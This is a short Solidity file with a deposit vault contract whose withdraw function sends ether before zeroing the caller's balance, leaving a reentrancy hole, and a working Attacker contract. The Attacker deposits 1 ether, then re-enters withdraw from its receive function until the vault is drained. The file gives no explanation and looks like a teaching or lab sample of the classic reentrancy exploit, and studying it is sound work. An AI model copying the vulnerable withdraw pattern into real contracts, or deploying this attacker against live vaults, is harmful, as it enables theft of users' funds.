// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IDepositVault {
    function deposit() external payable;

    function withdraw() external;
}

contract DepositVault is IDepositVault {
    constructor() payable {
        balances[msg.sender] = msg.value;
    }

    mapping (address => uint256) private balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0 wei);

        (bool sucess, ) = payable(msg.sender).call{value: balance}("");
        require(sucess);

        balances[msg.sender] = 0;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }
}

contract Attacker {
    IDepositVault public target;

    constructor(address _target) {
        target = IDepositVault(_target);
    }

    function attack() external payable {
        require(msg.value == 1 ether);
        target.deposit{value: msg.value}();

        target.withdraw();
    }

    receive() external payable { 
        if (address(target).balance >= 1 ether) target.withdraw();
    }
}